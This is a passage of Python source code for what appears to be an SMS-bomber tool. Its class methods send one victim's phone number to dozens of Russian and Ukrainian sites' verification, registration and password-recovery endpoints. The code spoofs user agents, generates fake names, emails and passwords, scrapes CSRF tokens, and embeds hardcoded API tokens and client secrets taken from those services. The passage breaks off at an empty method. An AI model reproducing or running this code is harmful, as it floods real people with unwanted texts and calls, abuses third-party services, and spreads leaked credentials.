         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post(f"https://bigd.host/Settings/SendPhoneVerificationCodeAjax?phoneNumber={self.phone}", headers=headers)

    def cian(self):
        agent = user_agent()
        requests.options('https://api.cian.ru/sms/v1/send-code/', headers={'Accept-Encoding':'gzip, deflate, br',
         'Connection':'keep-alive',
         'Referer':'https://www.cian.ru/authenticate/',
         'Access-Control-Request-Method':'POST',
         'User-Agent':agent,
         'DNT':'1'})
        requests.post('https://api.cian.ru/sms/v1/send-code/', headers={'Accept-Encoding':'gzip, deflate, br',
         'Connection':'keep-alive',
         'Referer':'https://www.cian.ru/authenticate/',
         'Access-Control-Request-Method':'POST',
         'Content-Type':'application/json',
         'User-Agent':agent,
         'DNT':'1'},
          json={'phone':self.phone,  'type':'authenticateCode'})

    def sushiwokru(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://sushiwok.ru/user/phone/validate', headers=headers, json={'phone':phone_mask(self.phone_not_pluse, '+#(###)###-##-##'),  'numbers':4})

    def bettery_ru(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://clientsapi02.at-resources.com/cps/superRegistration/createProcess', headers=headers, json={'fio':_ru_name_(),  'password':f" {password()}",  'email':email(),  'emailAdvertAccepted':'true',  'phoneNumber':self.phone,  'webReferrer':'',  'advertInfo':'',  'platformInfo':agent,  'promoId':'',  'sysId':1,  'lang':'ru'})

    def pass_media(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.get(f"https://pass.media/api/actions/check_phone/?phone={phone_mask(self.phone_not_pluse, '+# ### ### ## ##')}", headers=headers)

    def autheasypayua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post(f"https://auth.easypay.ua/api/users/desktop/forgot/{self.phone_not_pluse}", headers=headers_copy)

    def ionua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://ion.ua/api/apr/temporary-register', headers=headers_copy, json={'login': self.phone})

    def sloncreditua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://sloncredit.ua/client/login', headers=headers_copy, data={'phone': phone_mask(self.phone_not_pluse, '+## (###) ###-##-##'), 'agreement_1':'on'})

    def backzecreditcomua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://back.zecredit.com.ua/v1/api/rest/verifications', headers=headers_copy, json={'phone':self.phone_not_pluse,  'action':'REGISTRATION'})

    def ontaxicomua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://ontaxi.com.ua/api/v2/web/client', headers=headers_copy, json={'country':'UA',  'phone':self.phone_not_pluse[2:]})

    def ukloncomua_two(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://uklon.com.ua/api/v1/account/code/send', headers=headers_copy, json={'phone': self.phone_not_pluse})

    def partner_uklo_two(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://partner.uklon.com.ua/api/v1/registration/sendcode', headers=headers_copy, json={'phone': self.phone_not_pluse})

    def alloua(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://allo.ua/ua/customer/account/createPostVue/?isAjax=1&currentLocale=uk_UA', headers=headers_copy, data={'firstname':_ru_name_(),  'telephone':self.phone_not_pluse[1:],  'email':email(),  'password':'46lX2dnyUhDQ',  'form_key':'No7l3BqVVoQJ6Djm'})

    def n17459yclientscom(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://n17459.yclients.com/api/v1/book_code/26760', headers=headers_copy, json={'phone': self.phone_not_pluse})

    def passporttwitchtv_two(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://passport.twitch.tv/register?trusted_request=true', headers=headers_copy, json={'birthday':{'day':1,  'month':9,  'year':1997},  'client_id':'kd1unb4b3q4t58fwlpcbzcbnm76a8fp',  'include_verification_code':True,  'password':password(),  'phone_number':self.phone_not_pluse,  'username':username()})

    def apiiconjob_co_two(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://api.iconjob.co/api/auth/verification_code', headers=headers_copy, json={'phone': self.phone_not_pluse})

    def ggbetru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://ggbet.ru/api/auth/register-with-phone', headers=headers_copy, data={'phone':self.phone,  'login':email(),  'password':password(),  'agreement':'on',  'oferta':'on'})

    def durexrubackendprod(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://durex-ru-backend.prod.moscow.rbdigitalcloud.com/api/v1/users/confirmation_code/', headers=headers_copy, json={'phone': self.phone_not_pluse})

    def wwwdnsshopru_two(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://www.dns-shop.ru/auth/auth/fast-authorization/', headers=headers_copy, data={'FastAuthorizationLoginLoadForm[login]':self.phone_not_pluse,  'FastAuthorizationLoginLoadForm[token]':''})

    def almatyinstashopkz(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://almaty.instashop.kz/?login=yes', headers=headers_copy, data={'AUTH_FORM':'Y',  'USER_REMEMBER':'Y',  'backurl':'',  'TYPE':'CHECKLOGIN',  'is_ajax_request':'Y',  'USER_COUNTRY':self.country_code,  'USER_LOGIN':phone_mask(self.phone_not_pluse[1:], '###-###-##-##')})

    def gdz_ruwork(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://gdz-ru.work/api/subscriptions/subscribe/45?', headers=headers_copy, params={'return_to':'/subscribe/?return_to=%2Fgdz%2Falgebra%2F8-klass%2Fmuravin',  'book_id':'23143',  'src_host':'gdz.ltd',  'woid':'275004200',  'msisdn':self.phone_not_pluse,  'agreement':'1'})

    def smotrimru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://smotrim.ru/login', headers=headers_copy, data={'phone': self.phone_not_pluse})

    def wwwriglaru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://www.rigla.ru/rest/V1/mindbox/account/generateSMS', headers=headers_copy, json={'telephone': self.phone_not_pluse})

    def loymaxivoinru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration', headers=headers_copy, json={'password':'',  'login':self.phone_not_pluse})

    def amurfarmaru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://amurfarma.ru/local/templates/amurfarmacy_2015/ajax.php', headers=headers_copy, data={'ajaxtype':'send_sms',  'phone':phone_mask(self.phone, '+# (###) ###-##-##')})

    def kulinaristamarket(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://kulinarista.market/api/v1/auth/sms-code', headers=headers_copy, json={'phone': self.phone_not_pluse[1:]})

    def aptekamagnitu(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://apteka.magnit.ru/api/personal/auth/code/', headers=headers_copy, data={'phone': self.phone_not_pluse})

    def autodozvon(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://autodozvon.ru/test/makeTestCall', headers=headers_copy, params={'to': phone_mask(self.phone_not_pluse[1:], '(###) ##-##-##)')})

    def htvplatform24tv(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://24htv.platform24.tv/v2/otps', headers=headers_copy, json={'phone': self.phone_not_pluse})

    def apilike_videocom(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://api.like-video.com/likee-activity-flow-micro/commonApi/sendDownloadSms', headers=headers_copy, json={'telephone':self.phone_not_pluse,  'lang':'ru'})

    def mydrom_ru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://my.drom.ru/sign/recover?return=https%3A%2F%2Fchelyabinsk.drom.ru%2Fauto%2Fall%2F%3Futm_source%3Dyandexdirect%26utm_medium%3Dcpc%26utm_campaign%3Ddrom_74_chelyabinsk_auto-rivals_alldevice_search_handmade%26utm_content%3Ddesktop_search_text_main%26utm_term%3D%25D0%25B0%25D0%25B2%25D1%2582%25D0%25BE%25D1%2580%25D1%2583%2520%25D1%2587%25D0%25B5%25D0%25BB%25D1%258F%25D0%25B1%25D0%25B8%25D0%25BD%25D1%2581%25D0%25BA%26_openstat%3DZGlyZWN0LnlhbmRleC5ydTsxNzY3NTA4MzsxOTMxNzMyNzE4O3lhbmRleC5ydTpwcmVtaXVt%26yclid%3D7777444668347802164%26tcb%3D1609147011', headers=headers_copy, data={'sign': self.phone_not_pluse})

    def harabaru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://haraba.ru/Account/Register', headers=headers_copy, data={'phone':self.phone_not_pluse,  'pass1':'Myp-Vbq-RbE-zvH',  'pass2':'Myp-Vbq-RbE-zvH',  'ip':None,  'type':1,  'company':None})

    def zaimbistrodengi(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://zaim.bistrodengi.ru/sdo/user/loginLK', headers=headers_copy, json={'name':'Арсений Анатольевич',  'phoneNumber':self.phone_not_pluse,  'birthDate':'1984-01-04'})

    def passrutuberu(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.get('https://pass.rutube.ru/api/accounts/user-exists/', headers=headers_copy, params={'phone': self.phone})

    def mobileapiqiwicom(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://mobile-api.qiwi.com/oauth/authorize', headers=headers_copy, data={'response_type':'urn:qiwi:oauth:response-type:confirmation-id',  'username':self.phone,  'client_id':'android-qw',  'client_secret':'zAm4FKq9UnSe7id'})

    def medicina360ru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://medicina360.ru/site/generatesmscode', headers=headers_copy, data={'phone':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'),  'send_sms':1})

    def apieldoradoua_two(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.get(f"https://api.eldorado.ua/v2.0/sign?lang=ua&action=phone_check&login={self.phone_not_pluse}", headers=headers_copy)

    def wwwutairru(self):
        token = 'Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1NjkzIiwic2NvcGVzIjpbInVzZXIucHJvZmlsZSIsInVzZXIucHJvZmlsZS5lZGl0IiwidXNlci5wcm9maWxlLnJlcmVnaXN0cmF0aW9uIiwidXNlci5ib251cyIsInVzZXIucGF5bWVudHMuY2FyZHMiLCJ1c2VyLnJlZmVycmFscyIsInVzZXIuc3lzdGVtLmZlZWRiYWNrIiwidXNlci5jb21wYW55IiwidXNlci5leHBlcmVtZW50YWwucnpkIiwiYXBwLnVzZXIucmVnaXN0cmF0aW9uIiwiYXBwLmJvbnVzIiwiYXBwLmJvb2tpbmciLCJhcHAuY2hlY2tpbiIsImFwcC5haXJwb3J0cyIsImFwcC5jb3VudHJpZXMiLCJhcHAudG91cnMiLCJhcHAucHJvbW8iLCJhcHAuc2NoZWR1bGUiLCJhcHAucHJvbW8ucHJlcGFpZCIsImFwcC5zeXN0ZW0uZmVlZGJhY2siLCJhcHAuc3lzdGVtLnRyYW5zYWN0aW9ucyIsImFwcC5zeXN0ZW0ucHJvZmlsZSIsImFwcC5zeXN0ZW0udGVzdC5hY2NvdW50cyIsImFwcC5zeXN0ZW0ubGlua3MiLCJhcHAuc3lzdGVtLm5vdGlmaWNhdGlvbiIsImFwcC5kYWRhdGEiLCJhcHAuYWIiLCJhcHAuY29tcGFueSIsImFwcC5zZXJ2aWNlcyJdLCJleHAiOjE2NDExODIzNDh9.crO5rLAZ1btPDgplxCVPjx9NtO_nHB7I83Gyf1QYeGE'
        requests.post('https://www.utair.ru/mobile/api/v8/account/profile', json={'login':self.phone_not_pluse,  'confirmationGDPRDate':'1609647178956'}, headers={'Authorization':token,  'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36'})
        requests.post('https://www.utair.ru/mobile/api/v8/user/login', json={'login':self.phone_not_pluse,  'confirmationType':'callCode'}, headers={'Authorization':token,  'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36'})

    def x80aaiccccwa6aik(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post(f"https://xn--80aaiccccwa6aiktadcodj9azr.xn--p1ai/ajax/vote.php?mode=sendphone&vote_id=109&vote_phone={phone_mask(self.phone_not_pluse, '+# (###) ###-##-##')}&url=https://xn--80aaiccccwa6aiktadcodj9azr.xn--p1ai/", headers=headers_copy)

    def disk_apimegafonru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://disk-api.megafon.ru/api/3/md_otp_tokens/', json={'phone': self.phone_not_pluse}, headers=headers_copy)

    def apteka_one(self):
        try:
            auth_html = requests.get('https://apteka38plus.ru/register')
            auth_bs = bs(auth_html.content, 'html.parser')
            token = auth_bs.select('meta[name=csrf-token]')[0]['content']
            password = password()
            for i in range(2):
                requests.post('https://apteka38plus.ru/register/confirm', data={'_token':token,  'name':_ru_name_(),  'phone':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'),
                 'email':email(),
                 'password':password,  'password_confirmation':password,  'redirect_to':'https://apteka38plus.ru/verify',
                 'notify_offers':'on'})

        except:
            pass

    def api_sushisellru(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.options('https://api.sushisell.ru/v2/auth', headers=headers_copy)
        requests.post('https://api.sushisell.ru/v2/auth', json={'phone': self.phone_not_pluse}, headers=headers_copy)

    def sergiopizza(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        phone = phone_mask(self.phone_not_pluse, '+#(###)###-##-##')
        password = password()

        requests.post('https://sergiopizza.ru/ajax/register.php', data={'authPhone':phone, 'authPassword': password, 'authPassword2': password}, headers=headers_copy)
        requests.post('https://sergiopizza.ru/ajax/remind.php', data={'authPhone': phone}, headers=headers_copy)

    def unicom24(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.put('https://unicom24.ru/api/signin/phone/sms', headers=headers_copy, json={'phone_number': self.phone_not_pluse})

    def zoloto585_2(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        ddd = f"0"+str(random.choice([1,2,3,4,5,6,7,8,9]))+".0"+str(random.choice([1,2,3,4,5,6,7,8,9]))+".198"+str(random.choice([1,2,3,4,5,6,7,8,9]))+""
        print(ddd)
        requests.post('https://zoloto585.ru/api/bcard/reg2/', json={'birthdate': ddd, 'city': "Москва", 'email': email(), 'name': _ru_name_(), 'patronymic': _ru_name_(), 'phone': phone_mask(self.phone_not_pluse, "+# (###) ###-###-##"), 'sex': "m", 'surname':_ru_name_()}, headers=headers_copy)

    def mymodulbank(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://my.modulbank.ru/api/v2/auth/phone', json={'Cellphone': self.phone_not_pluse}, headers=headers_copy)

    def tvmtsru(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn 799": self.phone_not_pluse}, headers=headers_copy)

    def wwwtanukiru(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://www.tanuki.ru/sendCode/', json={'phone': f"(+7){self.phone_not_pluse[1:]}", 'smsType': 1, 'headers': {'cityId': "1", 'dbgValue': "", 'debugMode': 'true', 'langId': "1", 'userId': "666ebf12-9cd5-ed2f-a7c9-67f3a8d99ab1", 'version': "2.0", 'agent': {'device': "desktop", 'version': "undefined undefined"}}}, headers=headers_copy)

    def cashucom(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://cash-u.com/main/rest/firstrequest/phone/confirmation/send', data=phone_mask(self.phone_not_pluse, '# (###) ###-##-##:'), headers=headers_copy)

    def apizenkyio(self):

        headers_copy = user_agent()
        phone = phone_mask(self.phone_not_pluse, "+# (###) ###-##-##")
        requests.post('https://api.zenky.io/v2/auth/register', json={'phone':phone, 'phone_country': "RU", 'password': password()}, headers={'User-Agent':headers_copy,'x-store-id': '92037185-cce3-45dd-bf11-b52fe4a9cdc1'})
        requests.post('https://api.zenky.io/v2/auth/register/resend', json={'phone': phone, 'phone_country': "RU"}, headers={'User-Agent':headers_copy,'x-store-id': '92037185-cce3-45dd-bf11-b52fe4a9cdc1'})

    def sbguestsushiboxorg(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://sbguest.sushibox.org/api/v1/users/authorization?api_token=QsWwXIIoVl6F0Zm0cnjRWnvPkEUMqqx66QHBmk3qe0kD7p2RWXzPsgIn2DfN', json={'phone': self.phone_not_pluse}, headers=headers_copy)

    def apipapajohnsru(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://api.papajohns.ru/user/confirm-code', json={'lang': "ru", 'platform': "web-mobile", 'city_id': "1", 'type': "recovery_password", 'phone': self.phone}, headers=headers_copy)

    def pizzaboxru(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        password = password()
        requests.post('https://pizzabox.ru/?action=auth', data={'CSRF': None,  'ACTION': 'REGISTER', 'MODE': 'PHONE', 'PHONE': phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'), 'PASSWORD': password, 'PASSWORD2': password}, headers=headers_copy)

    def burgerking(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://burgerking.ru/middleware/bridge/api/v3/auth/signup', json={'phone': self.phone_not_pluse, 'invite': ''}, headers=headers_copy)

    def kakvkusno_ru(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://kakvkusno.ru/local/ajax/login.php', data={'GET_CODE': 1, 'PHONE': phone_mask(self.phone_not_pluse, '+#(###)###-##-##')}, headers=headers_copy)

    def igooodsru(self):

        requests.post('https://igooods.ru/api/v8/send_mobile_app_invitation', json={'phone': self.phone_not_pluse[1:]}, headers={'X-Platform': 'web', 'X-Type': 'desktop', 'X-User-Id': '24089932', 'X-User-Token': 'iTGhL6FnoyJsymyVQSk5'})

    def starboxvrn(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://starboxvrn.ru/local/ajax/auth_phone.php', data={'auth_phone': 'Y', 'action': 'auth_phone', 'PHONE': phone_mask(self.phone_not_pluse, '+# (###) ###-####')},  headers=headers_copy)

    def rollserv(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.post('https://rollserv.ru/user/NewUser/?async=json', data={'type': '2', 'ext[2][1]': _ru_name_(), 'user[cellphone]': self.phone, 'user[i_agree]': 'on'}, headers=headers_copy)
        requests.post('https://rollserv.ru/user/RestorePwd/', data={'login': self.phone}, headers=headers_copy)

    def igooods_two(self):

        req=requests.get('https://igooods.ru/')
        requests.patch('https://igooods.ru/api/v8/profile', json={'phone': self.phone_not_pluse[1:]}, headers={'X-Platform': 'web', 'X-Type': 'desktop', 'X-User-Id': '24089932', 'X-User-Token': 'iTGhL6FnoyJsymyVQSk5'}, cookies=req.cookies)
        requests.post('https://igooods.ru/api/v8/profile/send_code', headers={'X-Platform': 'web', 'X-Type': 'desktop', 'X-User-Id': '24089932', 'X-User-Token': 'iTGhL6FnoyJsymyVQSk5'}, cookies=req.cookies)


    def zoopt_two(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        requests.get('https://zoopt.ru/', headers=headers_copy)
        requests.post('https://zoopt.ru/api_v2/', data={'module': 'salin.core', 'class': 'BonusServer\Auth', 'action': 'SendSms', 'phone': phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'), 'RS_USER_AGREEMENT': '1'}, headers=headers_copy)

    def yobidoyobi(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://yobidoyobi.ru/api/login/request_sms', data={'phone': phone_mask(self.phone_not_pluse, '+# (###) ###-##-##')}, headers={'x-csrf-token': bs(requests.get('https://yobidoyobi.ru/yoshkar-ola').content, 'html.parser').find('input')['value'], 'User-Agent': user_agent()})

    def sberfood(self):

        requests.post('https://app.sberfood.ru/api/mobile/v3/auth/sendSms', json={'userPhone': self.phone}, cookies=requests.get('https://app.sberfood.ru/auth?redirect=%2F').cookies, headers={'Host': 'app.sberfood.ru', 'Connection': 'keep-alive', 'Content-Length': '28', 'Origin': 'https://app.sberfood.ru', 'AppPlatform': 'Web', 'Features': 'Afisha, SplitOrder, ReferralCampaign', 'Accept-Language': 'ru-RU', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36', 'Content-Type': 'application/json;charset=UTF-8', 'Accept': 'application/json, text/plain, */*', 'Token': '[object Object]', 'userid': '[object Object]', 'mrid': '6480ef6e-896e-4f59-8144-f3c14c87f88d', 'AppKey': 'WebApp-3a2605b0cf2a4c9d938752a84b7e97b6', 'AppVersion': '1', 'Referer': 'https://app.sberfood.ru/auth?redirect=%2F', 'Accept-Encoding': 'gzip, deflate, br'})

    def lbelkacaru_two(self):

        requests.post('https://lk.belkacar.ru/get-confirmation-code', data={'_token': bs(requests.get('https://lk.belkacar.ru/login').content, 'html.parser').select('input[name=_token]')[0]['value'], 'phone': self.phone})

    def broniboyru(self):

        token = bs(requests.get('https://broniboy.ru/moscow/').content, 'html.parser').select('meta[name=csrf-token]')[0]['content']
        requests.post('https://broniboy.ru/ajax/send-sms', data={'phone': phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'), '_csrf': token}, headers={'X-CSRF-Token': token, 'X-Requested-With': 'XMLHttpRequest', 'User-Agent':user_agent()})

    def yakitoriyaru(self):
        user=user_agent()

        req=requests.get('https://yakitoriya.ru/', headers={'Origin': 'https://yakitoriya.ru', 'Referer': 'https://yakitoriya.ru/', 'User-Agent':user})
        requests.post('https://yakitoriya.ru/users/request_sms_code/', data={'csrfmiddlewaretoken': req.cookies['csrftoken'], 'phone': phone_mask(self.phone_not_pluse, '+# (###)###-##-##')}, headers={'Origin': 'https://yakitoriya.ru', 'Referer': 'https://yakitoriya.ru/', 'User-Agent':user})

    def antisushiru(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        password = password()
        req=requests.get('https://anti-sushi.ru/', headers=headers_copy)
        requests.post('https://anti-sushi.ru/?auth',
                        data={'CSRF': None, 'ACTION': 'REGISTER', 'Session': req.cookies['SID'], 'NAME': _ru_name_(),
                              'PHONE': self.phone_not_pluse[1:], 'EMAIL': email(), 'PASSWORD': password,
                              'PASSWORD2': password}, headers=headers_copy)

    def newtelnet(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        headers_copy['origin'] = 'https://new-tel.net'
        headers_copy['referer'] = 'https://new-tel.net/uslugi/call-password/'
        requests.post('https://new-tel.net/ajax/a_api.php', params={'type': 'reg'},
        data={'phone': phone_mask(self.phone_not_pluse, '+# (###) ###-####'), 'token': '03AGdBq26wF9vypkRRBWWA2uEFxzuYUhrdmyPDZhexuQ1OfK5uC3Taz-57K9Xg3AzTfnqZ8Mh6S0LLB816L-o5fAzH75pq7ukCPCTmypRVtVOF9s3SY-E-KJJtfuPLm5SgovqUQB2XASVHcdb13UEiCmUK5nPeVZ-l3EfxbsPV1ClYcHJVds9p4plFO277bYF1Plsm85g_oeYiw9nJif0ehee7FiPHvqAzmTmjTiSNSrodGQt52qEBkLQt1Y8wfGVq2J-BlWYz4j8OBiy7I_1yXMy-UZLMj4JTtDAqJB8oubTMzxHRVGPgW-bd-y_0QgOaHUYNQ3HWmp0OZcOzLciK_IW7JRI_fRArRWdkVq62bfq-yYhP5dwz4y_EHdg4ZnRusGODw0jEmt9HMWA0EaTXVfanN2sa-oU0NM8ttRdWQmgSPKJtF3sJm0WdjzkHfjquORz82dCctbXz'}, headers=headers_copy)

    def ulyanovsk(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        password = password()
        requests.post('https://ulyanovsk.farfor.ru/registration/', data={'csrfmiddlewaretoken': 'Xc7lvgNcuNsVAlu1A2RICDL7oNDmOlIelnYkQc9B85eQn0PN5foqXpQQCoJ411KV', 'token': '03AGdBq25Vs3vUKLQ4wcx4QQ4jVx_T1X07ylhQMwDps_n5kIrt13H0iuiChuT5_oMGoq4sRQ-V0ZUsgoCTsHNggKaOHXWJszu97QnnOgNK5IX9l9FcrDfK9Hdb4tQOZUZlOoEHsP9ZmaryU11ms2SaJjnIeDiysu-56rh_s7kNKIGWCz6frEbF8FA2GkZ8kVLrRmTdUJbDysUPRqocnhmnRmuQEySONwHsIv1Qm_LMvmDv6xtzT2Bpm8XJnayihaGxKwsCm_xnCu9voUTEGDsZwp3o1xBRaZTvXeWVdyU_g9lL2GAkv9KFZLDhBIcyyha-_3H-XcCcZR9_UcttHN9F3PiNCYCvLRleQB2uu71-ZWPXtiabQTGIdpv06FcksKP3qh8dwvWYIY5qrep1ZE4wqt-KAmWGpxt4nN3J-qLXrt02r3qRCQCia-SObLeItjVhMB3ek3yFOTEsvYQ_mOeMYJ74xI6hSkTdWQ', 'name': _ru_name_(), 'phone': phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'), 'email': email(), 'password1_confirmation': password, 'password1': password, 'smscode': None, 'request-type': 'call'}, headers=headers_copy)

    def retailkbkbappru(self):

        requests.get(f'https://retail-kb.kbapp.ru/api/v1/accounts/auth/send?phone={self.phone_not_pluse}', headers={"app": "ru.napoleonit.kb", "duration": "328ms", "User-Agent": "RedWhite/2.18.3 (OnePlus A5010; Android 25; 2; 36ac-2729-3fa5-44ff)", "Host": "retail-kb.kbapp.ru", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"})

    def loyalty_apidixyru(self):

        requests.post('https://loyalty-api.dixy.ru//api/v1/users/register', headers={'appinfo': 'eyJhcHBfdmVyc2lvbiI6IjIuMi4yKzMyMCIsImRldmljZSI6ImFuZHJvaWQiLCJkZXZpY2VfaWQiOiIyZGQ5YmZjZmUxOGMyMjYyIiwib3NfdmVyc2lvbiI6InNkazoyOCJ9', 'dixy-api-token': '7b2f81beb3bc53c95ea7074b9be34b14ca1cb9e0aad355d9be3defb7df54072a64f172051582b9276db166c18c4f410ca21ca603f04e3765c971f590fb7b0c5d'}, json={"user": {"phone": self.phone_not_pluse, "platform": "android", "sms_hash": "EnLcVjUZitT", "loyalty_region_id": "1"}})

    def utkonos(self):

        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()

        payload = 'request={"Body":{"Phone":"' + phone_mask(self.phone_not_pluse, '+# ### ###-##-##') + '"},"Head":{"AdvertisingId":"3c725030-70c6-4945-8f75-69d1a5291793","AppsFlyerId":"1612665578706-4330044335349244143","AuthToken":"9FC2CF6CAB40F5BBCF6597AA9759D40B","Client":"android_9_4.35.3","DeviceId":"3c725030-70c6-4945-8f75-69d1a5291793","MarketingPartnerKey":"mp30-5332b7f24ba54351047601d78f90dafbfd7fcc295f966d3af19aeb","SessionToken":"9FC2CF6CAB40F5BBCF6597AA9759D40B","Store":"utk","Theme":"dark","Username":"","Password":""}}'
        requests.get("https://www.utkonos.ru/api/v1/SendSmsAuthCode", params=payload)

    def appsmapisportmasterru(self):

        requests.post("https://moappsmapi.sportmaster.ru/api/v1/code", headers={"X-SM-MobileApp": "2dd9bfcfe18c2262", "App-Version": "3.60.5(21555)", "OS": "ANDROID", "Device-Model": "Samsung SM-A205FN", "OS-Version": "9", "User-Agent": "mobileapp-android-9", "Build-Mode": "Production"}, json={"type": "phone", "value": self.phone_not_pluse[1:]})

    def apidetmirru(self):

